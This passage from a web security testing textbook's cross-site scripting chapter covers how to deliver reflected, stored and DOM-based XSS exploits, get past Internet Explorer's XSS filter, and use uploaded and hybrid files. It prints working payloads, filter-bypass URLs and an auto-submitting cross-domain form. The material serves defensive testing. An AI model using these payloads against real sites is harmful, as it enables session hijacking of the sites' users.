is\noutside the control of the application’s fi lters and may be arbitrarily long. For\nexample:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>eval(location.hash\n.substr(1))</script>#alert(‘long script here ......’)\nHere is an even shorter version that works in most situations:\nhttp://mdsec.net/error/5/Error.ashx?message=<script>eval(unescape(location))\n</script>#%0Aalert(‘long script here ......’)\nIn this version, the whole of the URL is URL-decoded and then passed to the\neval command. The whole URL executes as valid JavaScript because the http:\nprotocol prefi x serves as a code label, the // following the protocol prefi x serves\nas a single-line comment, and the %0A is URL-decoded to become a newline,\nsignaling the end of the comment.\nDelivering Working XSS Exploits\nTypically, when you are working on a potential XSS vulnerability to understand\nand bypass the application’s fi lters, you are working outside the browser, using\na tool such as Burp Repeater to send the same request repeatedly, modifying\nthe request in small ways each time, and testing the effect on the response. In\nsome situations, after you have created a proof-of-concept attack in this way,\nyou still may have work to do in order to deliver a practical attack against other\napplication users. For example, the entry point for the XSS may be nontrivial to\ncontrol in other users’ requests, such as a cookie or the Referer header. Or the\ntarget users may be using a browser with built-in protection against refl ected\nXSS attacks. This section examines various challenges that may arise when\ndelivering working XSS exploits in practice and how they can be circumvented.\nEscalating an Attack to Other Application Pages\nSuppose the vulnerability you have identifi ed is in an uninteresting area of the\napplication, affecting only unauthenticated users, and a different area contains\nthe really sensitive data and functionality you want to compromise.\nIn this situation, it is normally fairly easy to devise an attack payload that\nyou can deliver via the XSS bug in one area of the application and that persists\nwithin the user’s browser to compromise the victim anywhere he goes on the\nsame domain.\nOne simple method of doing this is for the exploit to create an iframe cover-\ning the whole browser window and reload the current page within the iframe.\nAs the user navigates through the site and logs in to the authenticated area,\nthe injected script keeps running in the top-level window. It can hook into all\ncc1122..iinndddd 447733 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 474\n474 Chapter 12 n Attacking Users: Cross-Site Scripting\nnavigation events and form submissions in the child iframe, monitor all response\ncontent appearing in the iframe, and, of course, hijack the user’s session when\nthe moment is right. In HTML5-capable browsers, the script can even set the\nappropriate URL in the location bar as the user moves between pages, using\nthe window.history.pushState() function.\nFor one example of this kind of exploit, see this URL:\nhttp://blog.kotowicz.net/2010/11/xss-track-how-to-quietly-track-whole.html\nCOMMON MYTH\n“We’re not worried about any XSS bugs in the unauthenticated part of our\nsite. They can’t be used to hijack sessions.”\nThis thought is erroneous for two reasons. First, an XSS bug in the unau-\nthenticated part of an application normally can be used to directly compro-\nmise the sessions of authenticated users. Hence, an unauthenticated refl ected\nXSS fl aw typically is more serious than an authenticated one, because the\nscope of potential victims is wider. Second, even if a user is not yet authen-\nticated, an attacker can deploy some Trojan functionality that persists in the\nvictim’s browser across multiple requests, waiting until the victim logs in, and\nthen hijacking the resulting session. It is even possible to capture a user’s\npassword using a keylogger written in JavaScript, as described in Chapter 13.\nModifying the Request Method\nSuppose that the XSS vulnerability you have identifi ed uses a POST request, but the\nmost convenient method for delivering an attack requires the GET method — for\nexample, by submitting a forum post containing an IMG tag targeting the vul-\nnerable URL.\nIn these cases, it is always worth verifying whether the application handles\nthe request in the same way if it is converted to a GET request. Many applications\ntolerate requests in either form.\nIn Burp Suite, you can use the “change request method” command on the\ncontext menu to toggle any request between the GET and POST methods.\nCOMMON MYTH\n“This XSS bug isn’t exploitable. I can’t get my attack to work as a GET\nrequest.”\nIf a refl ected XSS fl aw can only be exploited using the POST method, the\napplication is still vulnerable to various attack delivery mechanisms, including\nones that employ a malicious third-party website.\ncc1122..iinndddd 447744 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 475\nChapter 12 n Attacking Users: Cross-Site Scripting 475\nIn some situations, the opposite technique can be useful. Converting an attack that\nuses the GET method into one that uses the POST method may enable you to bypass\ncertain fi lters. Many applications perform some generic application-wide fi ltering\nof requests for known attack strings. If an application expects to receive requests\nusing the GET method, it may perform this fi ltering on the URL query string only. By\nconverting a request to use the POST method, you may be able to bypass this fi lter.\nExploiting XSS Via Cookies\nSome applications contain refl ected XSS vulnerabilities for which the entry point\nfor the attack is within a request cookie. In this situation, you may be able to\nuse various techniques to exploit the vulnerability:\nn As with modifying the request method, the application may allow you to\nuse a URL or body parameter with the same name as the cookie to trigger\nthe vulnerability.\nn If the application contains any functionality that allows the cookie’s value\nto be set directly (for example, a preferences page that sets cookies based\non submitted parameter values), you may be able to devise a cross-site\nrequest forgery attack that sets the required cookie in the victim’s browser.\nExploiting the vulnerability would then require the victim to be induced\ninto making two requests: to set the required cookie containing an XSS\npayload, and to request the functionality where the cookie’s value is\nprocessed in an unsafe way.\nn Historically, various vulnerabilities have existed in browser extension\ntechnologies, such as Flash, that have enabled cross-domain requests to be\nissued with arbitrary HTTP headers. Currently at least one such vulner-\nability is widely known but not yet patched. You could leverage one of\nthese vulnerabilities in browser plug-ins to make cross-domain requests\ncontaining an arbitrary cookie header designed to trigger the vulnerability.\nn If none of the preceding methods is successful, you can leverage any other\nrefl ected XSS bug on the same (or a related) domain to set a persistent\ncookie with the required value, thereby delivering a permanent compro-\nmise of the victim user.\nExploiting XSS in the Referer Header\nSome applications contain refl ected XSS vulnerabilities that can only be trig-\ngered via the Referer header. These are typically fairly easy to exploit using a\nweb server controlled by the attacker. The victim is induced to request a URL\non the attacker’s server that contains a suitable XSS payload for the vulnerable\napplication. The attacker’s server returns a response that causes a request to the\nvulnerable URL, and the attacker’s payload is included in the Referer header\nthat is sent with this request.\ncc1122..iinndddd 447755 88//1199//22001111 1122::1122::3311 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 476\n476 Chapter 12 n Attacking Users: Cross-Site Scripting\nIn some situations, the XSS vulnerability is triggered only if the Referer header\ncontains a URL on the same domain as the vulnerable application. Here, you\nmay be able to leverage any on-site redirector functions within the application\nto deliver your attack. To do this, you need to construct a URL to the redirector\nfunction that both contains a valid XSS exploit and causes a redirection to the\nvulnerable URL. The success of this attack depends on the redirection method\nthe function uses and on whether current browsers update the Referer header\nwhen following redirections of that type.\nExploiting XSS in Nonstandard Request and Response Content\nToday’s complex applications increasingly employ Ajax requests that do not\ncontain traditional request parameters. Instead, requests often contain data in\nformats such as XML and JSON, or employing various serialization schemes.\nCorrespondingly, the responses to these requests frequently contain data in the\nsame or another format, rather than HTML.\nThe server-side functionality involved in these requests and responses often\nexhibits XSS-like behavior. Request payloads that normally would indicate the\npresence of a vulnerability are returned unmodifi ed by the application.\nIn this situation, it is still possible that the behavior can be exploited to deliver\nan XSS attack. To do so, you need to meet two distinct challenges:\nn You need to fi nd a means of causing a victim user to make the necessary\nrequest cross-domain.\nn You need to fi nd a way of manipulating the response so that it executes\nyour script when consumed by the browser.\nNeither of these challenges is trivial. First, the requests in question typically\nare made from JavaScript using XMLHttpRequest (see Chapter 3). By default,\nthis cannot be used to make cross-domain requests. Although XMLHttpRequest\nis being modifi ed in HTML5 to allow sites to specify other domains that may\ninteract with them, if you fi nd a target that allows third-party interaction, there\nare probably simpler ways for you to compromise it (see Chapter 13).\nSecond, in any attack, the response returned by the application would be con-\nsumed directly by the victim’s browser, not by the custom script that processes\nit in its original context. The response will contain data in whatever non-HTML\nformat is being used, usually with the corresponding Content-Type header. In\nthis situation, the browser processes the response in the normal way for this\ndata type (if recognized), and normal methods for introducing script code via\nHTML may be irrelevant.\nAlthough nontrivial, in some situations both of these challenges can be\nmet, allowing the XSS-like behavior to be exploited to deliver a working\nattack. We will examine how this can be done using the XML data format\nas an example.\ncc1122..iinndddd 447766 88//1199//22001111 1122::1122::3322 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 477\nChapter 12 n Attacking Users: Cross-Site Scripting 477\nSending XML Requests Cross-Domain\nIt is possible to send near-arbitrary data cross-domain within the HTTP request\nbody by using an HTML form with the enctype attribute set to text/plain. This\ntells the browser to handle the form parameters in the following way:\nn Send each parameter on a separate line within the request.\nn Use an equals sign to separate the name and value of each parameter (as\nnormal).\nn Do not perform any URL encoding of parameter names or values.\nAlthough some browsers do not honor this specifi cation, it is properly honored\nby current versions of Internet Explorer, Firefox, and Opera.\nThe behavior described means that you can send arbitrary data in the message\nbody, provided that there is at least one equals sign anywhere within the data. To\ndo this, you split the data into two chunks, before and after the equals sign. You\nplace the fi rst chunk into a parameter name and the second chunk into a parameter\nvalue. When the browser constructs the request, it sends the two chunks separated\nby an equals sign, thereby exactly constructing the required data.\nSince XML always contains at least one equals sign, in the version attribute of\nthe opening XML tag, we can use this technique to send arbitrary XML data cross-\ndomain in the message body. For example, if the required XML were as follows:\n<?xml version=”1.0”?><data><param>foo</param></data>\nwe could send this using the following form:\n<form enctype=”text/plain” action=”http://wahh-app.com/ vuln.php”\nmethod=”POST”>\n<input type=”hidden” name=’<?xml version’\nvalue=’”1.0”?><data><param>foo</param></data>’>\n</form><script>document.forms[0].submit();</script>\nTo include common attack characters within the value of the param parameter,\nsuch as tag angle brackets, these would need to be HTML-encoded within the\nXML request. Therefore, they would need to be double HTML-encoded within\nthe HTML form that generates that request.\nTIP You can use this technique to submit cross-domain requests containing\nvirtually any type of content, such as JSON-encoded data and serialized binary\nobjects, provided you can incorporate the equals character somewhere within\nthe request. This is normally possible by modifying a free-form text fi eld within\nthe request that can contain an equals character. For example in the following\nJSON data, the comment fi eld is used to introduce the required equals character:\n{ “name”: “John”, “email”: “gomad@diet.com”, “comment”: “=” }\ncc1122..iinndddd 447777 88//1199//22001111 1122::1122::3322 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 478\n478 Chapter 12 n Attacking Users: Cross-Site Scripting\nThe only signifi cant caveat to using this technique is that the resulting request\nwill contain the following header:\nContent-Type: text/plain\nThe original request normally would have contained a different Content-Type\nheader, depending on exactly how it was generated. If the application tolerates\nthe supplied Content-Type header and processes the message body in the normal\nway, the technique can be used successfully when trying to develop a working\nXSS exploit. If the application fails to process the request in the normal way, on\naccount of the modifi ed Content-Type header, there may be no way to send a\nsuitable cross-domain request to trigger the XSS-like behavior.\nTIP If you identify XSS-like behavior in a request that contains nonstandard\ncontent, the fi rst thing you should do is quickly verify whether the behavior\nremains when you change the Content-Type header to text/plain. If it\ndoes not, it may not be worth investing any further effort in trying to develop\na working XSS exploit.\nExecuting JavaScript from Within XML Responses\nThe second challenge to overcome when attempting to exploit XSS-like behav-\nior in nonstandard content is to fi nd a way of manipulating the response so\nthat it executes your script when consumed directly by the browser. If the\nresponse contains an inaccurate Content-Type header, or none at all, or if your\ninput is being refl ected right at the start of the response body, this task may be\nstraightforward.\nUsually, however, the response includes a Content-Type header that accu-\nrately describes the type of data that the application returns. Furthermore, your\ninput typically is refl ected partway through the response, and the bulk of the\nresponse before and after this point will contain data that complies with the\nrelevant specifi cations for the stated content type. Different browsers take differ-\nent approaches to parsing content. Some simply trust the Content-Type header,\nand others inspect the content itself and are willing to override the stated type\nif the actual type appears different. In this situation, however, either approach\nmakes it highly unlikely that the browser will process the response as HTML.\nIf it is possible to construct a response that does succeed in executing a script, this\nnormally involves exploiting some particular syntactic feature of the type of content\nthat is being injected into. Fortunately, in the case of XML, this can be achieved by\nusing XML markup to defi ne a new namespace that is mapped to XHTML, causing\nthe browser to parse uses of that namespace as HTML. For example, when Firefox\nprocesses the following response, the injected script is executed:\nHTTP/1.1 200 Ok\nContent-Type: text/xml\ncc1122..iinndddd 447788 88//1199//22001111 1122::1122::3322 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 479\nChapter 12 n Attacking Users: Cross-Site Scripting 479\nContent-Length: 1098\n<xml>\n<data>\n...\n<a xmlns:a=’http://www.w3.org/1999/xhtml’>\n<a:body onload=’alert(1)’/></a>\n...\n</data>\n</xml>\nAs mentioned, this exploit succeeds when the response is consumed directly\nby the browser, and not by the original application component that would ordi-\nnarily process the response.\nAttacking Browser XSS Filters\nOne obstacle to the practical exploitation of virtually any refl ected XSS vulner-\nability arises from various browser features that attempt to protect users from\nprecisely these attacks. Current versions of the Internet Explorer browser include\nan XSS fi lter by default, and similar features are available as plug-ins to several\nother browsers. These fi lters all work in a similar way: they passively monitor\nrequests and responses, use various rules to identify possible XSS attacks in\nprogress, and, when a possible attack is identifi ed, modify parts of the response\nto neutralize the possible attack.\nNow, as we have discussed, XSS conditions should be considered vulner-\nabilities if they can be exploited via any browser in widespread usage, and the\npresence of XSS fi lters in some browsers does not mean that XSS vulnerabilities\ndo not need to be fi xed. Nevertheless, in some practical situations, an attacker\nmay specifi cally need to exploit a vulnerability via a browser that implements an\nXSS fi lter. Furthermore, the ways in which XSS fi lters can be circumvented are\ninteresting in their own right. In some cases they can be leveraged to facilitate\nthe delivery of other attacks that otherwise would be impossible.\nThis section examines Internet Explorer’s XSS fi lter. Currently it is the most\nmature and widely adopted fi lter available.\nThe core operation of the IE XSS fi lter is as follows:\nn In cross-domain requests, each parameter value is inspected to identify\npossible attempts to inject JavaScript. This is done by checking the value\nagainst a regex-based blacklist of common attack strings.\nn If a potentially malicious parameter value is found, the response is checked\nto see whether it contains this same value.\nn If the value appears in the response, the response is sanitized to prevent\nany script from executing. For example, <script> is modifi ed to become\n<sc#ipt>.\ncc1122..iinndddd 447799 88//1199//22001111 1122::1122::3322 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 480\n480 Chapter 12 n Attacking Users: Cross-Site Scripting\nThe fi rst thing to say about the IE XSS fi lter is that it is generally highly effec-\ntive in blocking standard exploitation of XSS bugs, considerably raising the bar\nfor any attacker who is attempting to perform these attacks. That said, the fi lter\ncan be bypassed in some important ways. You can also exploit how the fi lter\noperates to deliver attacks that otherwise would be impossible.\nFirst, some ways of bypassing the fi lter arise from core features of its design:\nn Only parameter values are considered, not parameter names. Some appli-\ncations are vulnerable to trivial attacks via parameter names, such as if\nthe whole of the requested URL or query string is echoed in the response.\nThese attacks are not prevented by the fi lter.\nn Because each parameter value is considered separately, if more than one\nparameter is refl ected in the same response, it may be possible to span an\nattack between the two parameters, as was described as a technique for\nbeating length limits. If the XSS payload can be split into chunks, none\nof which individually matches the blacklist of blocked expressions, the\nfi lter does not block the attack.\nn Only cross-domain requests are included, for performance reasons. Hence,\nif an attacker can cause a user to make an “on-site” request for an XSS URL,\nthe attack is not blocked. This can generally be achieved if the application\ncontains any behavior that allows an attacker to inject arbitrary links into a\npage viewed by another user (even if this is itself a refl ected attack; the XSS\nfi lter seeks to block only injected scripts, not injected links). In this scenario,\nthe attack requires two steps: the injection of the malicious link into a user’s\npage, and the user’s clicking the link and receiving the XSS payload.\nSecond, some implementation details regarding browser and server behavior\nallow the XSS fi lter to be bypassed in some cases:\nn As you have seen, browsers tolerate various kinds of unexpected char-\nacters and syntax when processing HTML, such as IE’s own tolerance of\nNULL bytes. The quirks in IE’s behavior can sometimes be leveraged to\nbypass its own XSS fi lter.\nn As discussed in Chapter 10, application servers behave in various ways\nwhen a request contains multiple request parameters with the same name.\nIn some cases they concatenate all the received values. For example, in\nASP.NET, if a query string contains:\np1=foo&p1=bar\nthe value of the p1 parameter that is passed to the application is:\np1=foo,bar\nIn contrast, the IE XSS fi lter still processes each parameter separately, even\nif they share the same name. This difference in behavior can make it easy\ncc1122..iinndddd 448800 88//1199//22001111 1122::1122::3322 PPMM"
  },
  {
    "input": "Finding and Exploiting Stored XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 481\nChapter 12 n Attacking Users: Cross-Site Scripting 481\nto span an XSS payload across several “different” request parameters with\nthe same name, bypassing the blacklist with each separate value, all of\nwhich the server recombines.\nTRY IT!\nCurrently the following XSS exploit succeeds in bypassing the IE XSS fi lter:\nhttp://mdsec.net/error/5/Error.ashx?message=<scr%00ipt%20\n&message=> alert(‘xss’)</script>\nThird, the way in which the fi lter sanitizes script code in application responses\ncan actually be leveraged to deliver attacks that otherwise would be impossible. The\ncore reason for this is that the fi lter operates passively, looking only for correlations\nbetween script-like inputs and script-like outputs. It cannot interactively probe\nthe application to confi rm whether a given piece of input actually causes a given\npiece of output. As a result, an attacker can actually leverage the fi lter to selectively\nneutralize the application’s own script code that appears within responses. If the\nattacker includes part of an existing script within the value of a request param-\neter, the IE XSS fi lter sees that the same script code appears in the request and\nthe response and modifi es the script in the response to prevent it from executing.\nSome situations have been identifi ed where neutralizing an existing script\nchanges the syntactic context of a subsequent part of the response that contains\na refl ection of user input. This change in context may mean that the application’s\nown fi ltering of the refl ected input is no longer suffi cient. Therefore, the refl ec-\ntion can be used to deliver an XSS attack in a way that was impossible without\nthe changes made by the IE XSS fi lter. However, the situations in which this\nhas arisen generally have involved edge cases with unusual features or have\nrevealed defects in earlier versions of the IE XSS fi lter that have since been fi xed.\nMore signifi cantly, an attacker’s ability to selectively neutralize an application’s\nown script code could be leveraged to deliver entirely different attacks by interfering\nwith an application’s security-relevant control mechanisms. One generic example\nof this relates to the removal of defensive framebusting code (see Chapter 13), but\nnumerous other examples may arise in connection with application-specifi c code\nthat performs key defensive security tasks on the client side.\nFinding and Exploiting Stored XSS Vulnerabilities\nThe process of identifying stored XSS vulnerabilities overlaps substantially\nwith that described for refl ected XSS. It includes submitting a unique string in\nevery entry point within the application. However, you must keep in mind some\nimportant differences to maximize the number of vulnerabilities identifi ed.\ncc1122..iinndddd 448811 88//1199//22001111 1122::1122::3333 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 482\n482 Chapter 12 n Attacking Users: Cross-Site Scripting\nHACK STEPS\n1. Having submitted a unique string to every possible location within the\napplication, you must review all of the application’s content and function-\nality once more to identify any instances where this string is displayed\nback to the browser. User-controllable data entered in one location (for\nexample, a name field on a personal information page) may be displayed\nin numerous places throughout the application. (For example, it could\nbe on the user’s home page, in a listing of registered users, in work flow\nitems such as tasks, on other users’ contact lists, in messages or ques-\ntions posted by the user, or in application logs.) Each appearance of the\nstring may be subject to different protective filters and therefore needs to\nbe investigated separately.\n2. If possible, all areas of the application accessible by administrators\nshould be reviewed to identify the appearance of any data controllable by\nnon-administrative users. For example, the application may allow admin-\nistrators to review log files in-browser. It is extremely common for this\ntype of functionality to contain XSS vulnerabilities that an attacker can\nexploit by generating log entries containing malicious HTML.\n3. When submitting a test string to each location within the application, it is\nsometimes insufficient simply to post it as each parameter to each page.\nMany application functions need to be followed through several stages\nbefore the submitted data is actually stored. For example, actions such\nas registering a new user, placing a shopping order, and making a funds\ntransfer often involve submitting several different requests in a defined\nsequence. To avoid missing any vulnerabilities, it is necessary to see each\ntest case through to completion.\n4. When probing for reflected XSS, you are interested in every aspect of a\nvictim’s request that you can control. This includes all parameters to the\nrequest, every HTTP header, and so on. In the case of stored XSS, you\nshould also investigate any out-of-band channels through which the\napplication receives and processes input you can control. Any such chan-\nnels are suitable attack vectors for introducing stored XSS attacks. Review\nthe results of your application mapping exercises (see Chapter 4) to iden-\ntify every possible area of attack surface.\n5. If the application allows files to be uploaded and downloaded, always\nprobe this functionality for stored XSS attacks. Detailed techniques for\ntesting this type of functionality are discussed later in this chapter.\n6. Think imaginatively about any other possible means by which data you\ncontrol may be stored by the application and displayed to other users. For\nexample, if the application search function shows a list of popular search\nitems, you may be able to introduce a stored XSS payload by searching\nfor it numerous times, even though the primary search functionality itself\nhandles your input safely.\ncc1122..iinndddd 448822 88//1199//22001111 1122::1122::3333 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 483\nChapter 12 n Attacking Users: Cross-Site Scripting 483\nWhen you have identifi ed every instance in which user-controllable data is\nstored by the application and later displayed back to the browser, you should\nfollow the same process described previously for investigating potential refl ected\nXSS vulnerabilities. That is, determine what input needs to be submitted to\nembed valid JavaScript within the surrounding HTML, and then attempt to\ncircumvent any fi lters that interfere with the processing of your attack payload.\nTIP When probing for refl ected XSS, it is easy to identify which request\nparameters are potentially vulnerable. You can test one parameter at a time\nand review each response for any appearance of your input. With stored XSS,\nhowever, this may be less straightforward. If you submit the same test string\nas every parameter to every page, you may fi nd this string reappearing at\nmultiple locations within the application. It may not be clear from the context\nprecisely which parameter is responsible for the appearance. To avoid this\nproblem, you can submit a different test string as every parameter when prob-\ning for stored XSS fl aws. For example, you can concatenate your unique string\nwith the name of the fi eld it is being submitted to.\nSome specifi c techniques are applicable when testing for stored XSS vulner-\nabilities in particular types of functionality. The following sections examine\nsome of these in more detail.\nTesting for XSS in Web Mail Applications\nAs we have discussed, web mail applications are inherently at risk of contain-\ning stored XSS vulnerabilities, because they include HTML content received\ndirectly from third parties within application pages that are displayed to users.\nTo test this functionality, ideally you should obtain your own e-mail account\non the application, send various XSS exploits in e-mail messages to yourself,\nand view each message within the application to determine whether any of the\nexploits are successful.\nTo perform this task in a thorough manner, you need to send all kinds of\nunusual HTML content within e-mails, as we described to test for bypasses in\ninput fi lters. If you restrict yourself to using a standard e-mail client, you will\nlikely fi nd that you have insuffi cient control over the raw message content, or\nthe client may itself sanitize or “clean up” your deliberately malformed syntax.\nIn this situation, it is generally preferable to use an alternative means of gen-\nerating e-mails that gives you direct control over the contents of messages. One\nmethod of doing this is using the UNIX sendmail command. You need to have\nconfi gured your computer with the details of the mail server it should use to\nsend outgoing mail. Then you can create your raw e-mail in a text editor and\nsend it using this command:\nsendmail -t test@example.org < email.txt\ncc1122..iinndddd 448833 88//1199//22001111 1122::1122::3333 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 484\n484 Chapter 12 n Attacking Users: Cross-Site Scripting\nThe following is an example of a raw e-mail fi le. As well as testing various\nXSS payloads and fi lter bypasses in the message body, you can also try specify-\ning a different Content-Type and charset:\nMIME-Version: 1.0\nFrom: test@example.org\nContent-Type: text/html; charset=us-ascii\nContent-Transfer-Encoding: 7bit\nSubject: XSS test\n<html>\n<body>\n<img src=``onerror=alert(1)>\n</body>\n</html>\n.\nTesting for XSS in Uploaded Files\nOne common, but frequently overlooked, source of stored XSS vulnerabilities\narises where an application allows users to upload fi les that can be downloaded\nand viewed by other users. This kind of functionality arises frequently in today’s\napplications. In addition to traditional work fl ow functions designed for fi le\nsharing, fi les can be sent as e-mail attachments to web mail users. Image fi les\ncan be attached to blog entries and can be used as custom profi le pictures or\nshared via photo albums.\nVarious factors may affect whether an application is vulnerable to uploaded\nfi le attacks:\nn During fi le upload, the application may restrict the fi le extensions that\ncan be used.\nn During fi le upload, the application may inspect the fi le’s contents to con-\nfi rm that this complies with an expected format, such as JPEG.\nn During fi le download, the application may return a Content-Type header\nspecifying the type of content that the application believes the fi le contains,\nsuch as image/jpeg.\nn During fi le download, the application may return a Content-Disposition\nheader that specifi es the browser should save the fi le to disk. Otherwise,\nfor relevant content types, the application processes and renders the fi le\nwithin the user’s browser.\nWhen examining this functionality, the fi rst thing you should do is try to\nupload a simple HTML fi le containing a proof-of-concept script. If the fi le is\naccepted, try to download the fi le in the usual way. If the original fi le is returned\nunmodifi ed, and your script executes, the application is certainly vulnerable.\ncc1122..iinndddd 448844 88//1199//22001111 1122::1122::3333 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 485\nChapter 12 n Attacking Users: Cross-Site Scripting 485\nIf the application blocks the uploaded fi le, try to use various fi le extensions,\nincluding .txt and .jpg. If the application accepts a fi le containing HTML when\nyou use a different extension, it may still be vulnerable, depending on exactly\nhow the fi le is delivered during download. Web mail applications are often\nvulnerable in this way. An attacker can send e-mails containing a seductive-\nsounding image attachment that in fact compromises the session of any user\nwho views it.\nEven if the application returns a Content-Type header specifying that the\ndownloaded fi le is an image, some browsers may still process its contents as\nHTML if this is what the fi le actually contains. For example:\nHTTP/1.1 200 OK\nContent-Length: 25\nContent-Type: image/jpeg\n<script>alert(1)</script>\nOlder versions of Internet Explorer behaved in this way. If a user requested a\n.jpg fi le directly (not via an embedded <img> tag), and the preceding response\nwas received, IE would actually process its contents as HTML. Although this\nbehavior has since been modifi ed, it is possible that other browsers may behave\nthis way in the future.\nHybrid File Attacks\nOften, to defend against the attacks described so far, applications perform\nsome validation of the uploaded fi le’s contents to verify that it actually con-\ntains data in the expected format, such as an image. These applications may\nstill be vulnerable, using “hybrid fi les” that combine two different formats\nwithin the same fi le.\nOne example of a hybrid fi le is a GIFAR fi le, devised by Billy Rios. A GIFAR\nfi le contains data in both GIF image format and JAR (Java archive) format and\nis actually a valid instance of both formats. This is possible because the fi le\nmetadata relating to the GIF format is at the start of the fi le, and the metadata\nrelating to the JAR format is at the end of the fi le. Because of this, applications\nthat validate the contents of uploaded fi les, and that allow fi les containing GIF\ndata, accept GIFAR fi les as valid.\nAn uploaded fi le attack using a GIFAR fi le typically involves the following\nsteps:\nn The attacker fi nds an application function in which GIF fi les that are\nuploaded by one user can be downloaded by other users, such as a user’s\nprofi le picture in a social networking application.\nn The attacker constructs a GIFAR fi le containing Java code that hijacks the\nsession of any user who executes it.\ncc1122..iinndddd 448855 88//1199//22001111 1122::1122::3333 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 486\n486 Chapter 12 n Attacking Users: Cross-Site Scripting\nn The attacker uploads the fi le as his profi le picture. Because the fi le contains\na valid GIF image, the application accepts it.\nn The attacker identifi es a suitable external website from which to deliver\nan attack leveraging the uploaded fi le. This may be the attacker’s own\nwebsite, or a third-party site that allows authoring of arbitrary HTML,\nsuch as a blog.\nn On the external site, the attacker uses the <applet> or <object> tag to load\nthe GIFAR fi le from the social networking site as a Java applet.\nn When a user visits the external site, the attacker’s Java applet executes\nin his browser. For Java applets, the same-origin policy is implemented\nin a different way than for normal script includes. The applet is treated\nas belonging to the domain from which it was loaded, not the domain\nthat invoked it. Hence, the attacker’s applet executes in the domain of the\nsocial networking application. If the victim user is logged in to the social\nnetworking application at the time of the attack, or has logged in recently\nand selected the “stay logged in” option, the attacker’s applet has full\naccess to the user’s session, and the user is compromised.\nThis specifi c attack using GIFAR fi les is prevented in current versions of the\nJava browser plug-in, which validates whether JAR fi les being loaded actually\ncontain hybrid content. However, the principle of using hybrid fi les to conceal\nexecutable code remains valid. Given the growing range of client-executable\ncode formats now in use, it is possible that similar attacks may exist in other\nformats or may arise in the future.\nXSS in Files Loaded Via Ajax\nSome of today’s applications use Ajax to retrieve and render URLs that are\nspecifi ed after the fragment identifi er. For example, an application’s pages may\ncontain links like the following:\nhttp://wahh-app.com/#profile\nWhen the user clicks the link, client-side code handles the click event, uses\nAjax to retrieve the fi le shown after the fragment, and sets the response within\nthe innerHtml of a <div> element in the existing page. This can provide a seam-\nless user experience, in which clicking a tab in the user interface updates the\ndisplayed content without reloading the entire page.\nIn this situation, if the application also contains functionality allowing you to\nupload and download image fi les, such as a user profi le picture, you may be able\nto upload a valid image fi le containing embedded HTML markup and construct\na URL that causes the client-side code to fetch the image and display it as HTML:\nhttp://wahh-app.com/#profiles/images/15234917624.jpg\ncc1122..iinndddd 448866 88//1199//22001111 1122::1122::3333 PPMM"
  },
  {
    "input": "Finding and Exploiting DOM-Based XSS Vulnerabilities",
    "output": "Stuttard c12.indd V2 - 08/10/2011 Page 487\nChapter 12 n Attacking Users: Cross-Site Scripting 487\nHTML can be embedded in various locations within a valid image fi le, includ-\ning the comment section of the image. Several browsers, including Firefox and\nSafari, happily render an image fi le as HTML. The binary parts of the image\nare displayed as junk, and any embedded HTML is displayed in the usual way.\nTIP Suppose a potential victim is using an HTML5-compliant browser, where\ncross-domain Ajax requests are possible with the permission of the requested\ndomain. Another possible attack in this situation would be to place an abso-\nlute URL after the fragment character, specifying an external HTML fi le that\nthe attacker fully controls, on a server that allows Ajax interaction from the\ndomain being targeted. If the client-side script does not validate that the URL\nbeing requested is on the same domain, the client-side remote fi le inclusion\nattack succeeds.\nBecause this validation of the URL’s domain would have been unnecessary\nin older versions of HTML, this is one example where the changes introduced\nin HTML5 may themselves introduce exploitable conditions into existing appli-\ncations that were previously secure.\nFinding and Exploiting DOM-Based XSS Vulnerabilities\nDOM-based XSS vulnerabilities cannot be identifi ed by submitting a unique string\nas each parameter and monitoring responses for the appearance of that string.\nOne basic method for identifying DOM-based XSS bugs is to manually walk\nthrough the application with your browser and modify each URL parameter to\ncontain a standard test string, such as one of the following:\n“<script>alert(1)</script>\n“;alert(1)//\n‘-alert(1)-’\nBy actually displaying each returned page in your browser, you cause all\nclient-side scripts to execute, referencing your modifi ed URL parameter where\napplicable. Any time a dialog box appears containing your cookies, you will\nhave found a vulnerability (which may be due to DOM-based or other forms\nof XSS). This process could even be automated by a tool that implemented its\nown JavaScript interpreter.\nHowever, this basic approach does not identify all DOM-based XSS bugs.\nAs you have seen, the precise syntax required to inject valid JavaScript into an\nHTML document depends on the syntax that already appears before and after\nthe point where the user-controllable string gets inserted. It may be necessary to\nterminate a single- or double-quoted string or to close specifi c tags. Sometimes\nnew tags may be required, but sometimes not. Client-side application code may\nattempt to validate data retrieved from the DOM, and yet may still be vulnerable.\ncc1122..iinndddd 448877 88//1199//22001111 1122::1122::3344 PPMM\nStuttard c12.indd V2 - 08/10/2011 Page 488\n488 Chapter 12 n Attacking Users: Cross-Site Scripting\nIf a standard test string does not happen to result in valid syntax when it\nis processed and inserted, the embedded JavaScript does not execute, and no\ndialog appears, even though the application may be vulnerable to a properly\ncrafted attack. Short of submitting every conceivable XSS attack string into every\nparameter, the basic approach inevitably misses a large number of vulnerabilities.\nA more effective approach to identifying DOM-based XSS bugs is to review\nall client-side JavaScript for any use of DOM properties that may lead to a vul-\nnerability. Various tools are available to help automate this process. One such\neffective tool is DOMTracer, available at the following URL:\nwww.blueinfy.com/tools.html\nHACK STEPS\nUsing the results of your application mapping exercises from Chapter 4,\nreview every piece of client-side JavaScript for the following APIs, which may\nbe used to access DOM data that can be controlled via a crafted URL:\nn document.location\nn document.URL\nn document.URLUnencoded\nn document.referrer\nn window.location\nBe sure to include scripts that appear in static HTML pages as well as\ndynamically generated pages. DOM-based XSS bugs may exist in any location\nwhere client-side scripts are used, regardless of the type of page or whether\nyou see parameters being submitted to the page.\nIn every instance where one of the preceding APIs is being used, closely\nreview the code to identify what is being done with the 